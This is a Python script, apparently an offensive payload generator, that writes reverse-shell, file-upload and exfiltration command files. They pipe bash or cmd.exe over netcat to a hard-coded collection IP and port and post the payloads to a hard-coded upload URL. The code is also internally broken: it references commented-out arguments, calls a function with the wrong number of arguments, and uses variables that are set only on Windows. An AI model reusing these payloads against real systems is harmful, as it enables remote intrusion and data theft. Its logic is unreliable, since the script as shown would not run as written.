import argparse
import platform

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')

    #Required arguments
    parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
    parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
    parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
    #parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=True)
    parser.add_argument('-a', type=str, default="ubuntux86", help='Target architecture: ubuntux86', dest='targetArch', required=False)

    #Optional arguments
    #parser.add_argument('-o', type=str, default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)

    args = parser.parse_args()

    systemVariables = {'OS': platform.system(),
                        'Ncat': 'Ncat' if platform.system() == 'Windows' else 'Ncat',
                        'Shell': ''}

    #Reverse Shell Payload
    if(args.payloadChoice == "RShell"):
        print("Reverse Shell payload generator.")
        shellDestination = "http://131.151.162.95:63412/upload"
        variables = "pass=abc321&payload="
        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, args.targetArch)

    #Command Execution Payload
    if(args.payloadChoice == "CExe"):
        print("Execute")

    #File-upload Payload
    if(args.payloadChoice == "Upload"):
        variables = "pass=abc321&payload="
        GenFileUpload("input", variables, args.collectionIP, args.collectionPort)
        print("Upload")

    #File-download Payload
    #The Exfil operation will download a target file from the server.
    if(args.payloadChoice == "exfil" ):
        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
        print("Exfil Payload Generated!")

    #System Information Retrieval Payload
    if(args.payloadChoice == "SysInfo"):
        return

    return

def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, variables, targetArch):
    if(systemVariables['OS'] == 'Windows'):
        newShell = "start cmd.exe @cmd /k"
        localNetCat = f'{systemVariables["Ncat"]} -l -p {collectionPort}'

    if(targetArch == "ubuntux86"):
        payload = "/bin/bash | nc {0} {1}".format(collectionIP, collectionPort)
    elif(targetArch == "Windows"):
        payload = "Ncat {0} {1} -e cmd.exe".format(collectionIP, collectionPort)

    with open('CMDTemplates/RShell', 'r') as file:
        RShellPayloadText = file.read().format(newShell, localNetCat, variables, payload.replace(' ', '%%20'), shellDestination)

    f = open("RShell.cmd", "w")
    f.write(RShellPayloadText)
    f.close()
    return

def GenFileUpload(uploadFile, variables, collectionIP, collectionPort):
    uploadcmd = "nc {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
    with open('CMDTemplates/Upload', 'r') as file:
        UploadPayloadText = file.read().format(collectionPort, uploadFile, variables, uploadcmd)

    f = open("Upload.cmd", "w")
    f.write(UploadPayloadText)
    f.close()
    return

def GenExfil(exfilFile, collectionIP, collectionPort):
    with open('CMDTemplates/Exfil', 'r') as file:
        ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)

    f = open("Exfil", "w")
    f.write(ExfilPayloadText)
    f.close()
    return

if __name__ == "__main__":
    main()
